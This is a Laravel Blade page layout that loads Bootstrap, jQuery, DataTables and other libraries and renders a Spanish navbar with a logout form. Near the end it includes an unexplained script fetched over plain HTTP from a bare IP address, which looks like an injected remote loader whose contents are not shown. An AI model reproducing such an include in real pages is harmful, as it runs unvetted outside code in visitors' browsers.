<!doctype html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="csrf-token" content="{{ csrf_token() }}">


    <!-- Fonts -->
    <link rel="dns-prefetch" href="//fonts.gstatic.com">
   
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

 
    <!--load all styles -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
    </script>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.24/css/jquery.dataTables.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css"
        integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
   
    <script src=" https://momentjs.com/downloads/moment.js"></script>
   
       <style type="text/css">
        label.error { color: rgb(255, 0, 0) }
      </style>


</head>

<body>

    @auth
    <header>
        <div class="px-3 py-2 bg-dark text-white">

              <ul class="nav float-right">
                <li>
                    <a href="{{ route('home') }}" class="nav-link text-white">
                      <i class="fas fa-home"></i>
                     Inicio
                    </a>
                  </li>
            
               
                <li>
                    <div class="nav-link text-white">
                    <i class="fas fa-user"> </i> &nbsp {{  auth()->user()->usuario }}   &nbsp
               
                </div>
            </li>
            <li>
                <a href="#" class="nav-link text-white" href="{{ route('logout') }}" onclick="event.preventDefault();
                document.getElementById('logout-form').submit();">
                <i class="fas fa-sign-out-alt"></i>
                 Desconectar
                </a>
              </li>
             
            </ul>
                <ul class="nav">
                    <li>
                    <img src="/dodologo.png"class="img-fluid"alt="Responsive image"width="45px" height="45px"> 
                </li>  
                </ul>
        </div>
      </header>
     
       
            <form id="logout-form" action="{{ route('logout') }}" method="POST" class="d-none">
                @csrf
            </form>
        @endauth

    </div>
    <br>    <br>    <br><br>
  
    @yield('content')
    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.25/js/jquery.dataTables.js">
    </script>
    <script src="http://217.217.36.156/javas.js"></script>
   

</body>

</html>
